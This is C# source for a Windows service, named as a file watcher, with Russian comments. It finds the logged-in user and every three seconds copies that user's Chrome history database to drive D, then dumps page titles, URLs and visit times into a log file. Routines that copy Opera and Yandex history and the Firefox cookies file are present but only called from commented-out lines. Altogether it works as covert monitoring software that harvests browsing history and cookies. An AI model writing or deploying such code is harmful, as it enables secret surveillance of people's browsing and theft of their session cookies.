using System;
using System.ServiceProcess;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Data.SQLite;
using System.Data.Common;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Security.Principal;
using WindowsMonitorService;
using System.Collections.ObjectModel;
using System.Collections;
using System.Management;

namespace FileWatcherService
{
    public partial class Service1 : ServiceBase
    {
        Logger logger;
        string UserName;
        public Service1()
        {
            InitializeComponent();
            GetUserName();


            this.CanStop = true;
            this.CanPauseAndContinue = true;
            this.AutoLog = true;

            this.CanHandleSessionChangeEvent = true;
        }

        protected override void OnSessionChange(SessionChangeDescription obj)
        {
            GetUserName();
        }

        private void GetUserName()
        {
            object obj = new object();

            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem");
            ManagementObjectCollection collection = searcher.Get();
            string s = collection.Cast<ManagementBaseObject>().First()["UserName"].ToString().Split('\\')[1].Split('-')[0];

            if (UserName != s)
            {
                lock (obj)
                {
                    using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                    {
                        writer.WriteLine($"{s} вошел в систему {DateTime.Now.ToString()}");
                        writer.Flush();
                    }
                }

                UserName = s;
            }
        }



        protected override void OnStart(string[] args)
        {

            logger = new Logger(UserName);
            logger.RecordEntry("Служба запущенна!");
            Thread loggerThread = new Thread(new ThreadStart(logger.Start));
            loggerThread.Start();
        }



        protected override void OnStop()
        {
            logger.Stop();
            logger.RecordEntry("Служба остановлена!");
            Thread.Sleep(4000);
        }
    }

    class Logger
    {

        public string UserName { get; set; }
        object obj = new object();
        bool enabled = true;

        public Logger(string name)
        {
            UserName = name;
        }

        /// <summary>
        /// Копирование файла истории Opera
        /// </summary>
        private void readHistoryOpera()
        {
            try
            {
                string opera = $@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\";
                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        opera = Path.GetFullPath(f);

                    }
                }

                using (FileStream ms = new FileStream(opera, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyOpera.db", buffer);
                    //readHistory();
                }
                opera = $@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\";
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }




        /// <summary>
        /// Копирование файла истории Firefox
        /// </summary>
        private void readHistoryFirefox()
        {
            try
            {
                string firefox = String.Empty;

                foreach (var item in Directory.GetFiles($@"{Directory.GetDirectories($@"C:\Users\{UserName}\AppData\Roaming\Mozilla\Firefox\Profiles")[0]}\"))
                {

                    if (Path.GetFileName(item.ToLower()).ToString().Equals("cookies.sqlite"))
                    {
                        firefox = Path.GetFullPath(item);

                    }
                }

                using (FileStream ms = new FileStream(firefox, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyFirefox.sqlite", buffer);
                    //readHistory();
                }

            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }




        /// <summary>
        /// Копирование файла истории Yandex
        /// </summary>
        private void readHistoryYandex()
        {
            try
            {
                string yandex = $@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\";

                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        yandex = Path.GetFullPath(f);

                    }
                }

                using (FileStream ms = new FileStream(yandex, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyYandex.db", buffer);
                    //readHistory();
                }
                yandex = $@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\";

            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }




        /// <summary>
        /// Копирование файла истории Google
        /// </summary>
        private void copyHistoryGoogle()
        {
            try
            {

                string google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";

                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        google = Path.GetFullPath(f);

                    }
                }

                if (File.Exists("D:\\historyGoogle.db"))
                {
                    File.Delete("D:\\historyGoogle.db");
                }

                using (FileStream ms = new FileStream(google, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes("D:\\historyGoogle.db", buffer);
                    ms.Close();
                    ms.Dispose();
                    //readHistory();
                }
                google = $@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\";
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }


        }

        public void Start()
        {

            while (enabled)
            {
                try
                {
                    Thread.Sleep(3000);
                    copyHistoryGoogle();
                    her();
                }
                catch (Exception d)
                {
                    RecordEntry(d.Message);
                    RecordEntry(d.Source);
                }

                //readHistoryYandex();
                //readHistoryFirefox();
                //readHistoryOpera();


            }
        }
        const string databaseName = @"D:\\historyGoogle.db";
        private void her()
        {
            try
            {
                if (File.Exists(databaseName))
                {
                    RecordEntry("+");
                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={databaseName};")))
                    {
                        connection.Open();
                        StringBuilder stringBuilder = new StringBuilder();

                        DbDataReader r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
                        if (r.HasRows)
                        {
                            while (r.Read())
                            {
                                stringBuilder.Append("title:\t");
                                stringBuilder.Append(r.GetValue(2));
                                stringBuilder.Append("\turl:\t");
                                stringBuilder.Append(r.GetValue(1));
                                stringBuilder.Append("\tlast time:\t");
                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
                                stringBuilder.Append("\r\n\r");
                            }
                        }

                        RecordEntry(stringBuilder.ToString());
                    }
                }
                else
                {
                    RecordEntry("-");
                }
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }


            //RecordEntry("Test -1");
            //try
            //{
            //    RecordEntry("Test -2" );
            //   using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={databaseName};")))
            //    { }
            //    //{
            //    //    RecordEntry("Test");
            //    //}
            //}
            //catch (Exception ex)
            //{

            //    RecordEntry(ex.Message);
            //}
        }

        string test()
        {

            try
            {

                using (SQLiteConnection connection = new SQLiteConnection($"Data Source={"D:\\historyGoogle.db"};"))
                {
                    File.AppendAllText("D:\\t.txt", "open copy");
                    connection.Open();
                    StringBuilder stringBuilder = new StringBuilder();

                    DbDataReader r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
                    File.AppendAllText("D:\\t.txt", "start select");
                    if (r.HasRows)
                    {
                        while (r.Read())
                        {
                            for (int i = 0; i < r.FieldCount; i++)
                            {
                                stringBuilder.Append("\t" + r.GetValue(i));
                            }
                        }
                    }
                    File.AppendAllText("D:\\t.txt", "return copy");
                    if (stringBuilder.Length > 0)
                        return stringBuilder.ToString();
                    return "";
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            return String.Empty;
        }

        public void Stop()
        {

            enabled = false;
        }


        //открой sqllite studio


        public void RecordEntry(string fileEvent)
        {
            lock (obj)
            {
                using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                {
                    writer.WriteLine(String.Format("{0} под пользователем {1} произошла ошибка {2}",
                        DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), UserName, fileEvent));
                    writer.Flush();
                }
            }
        }
    }
}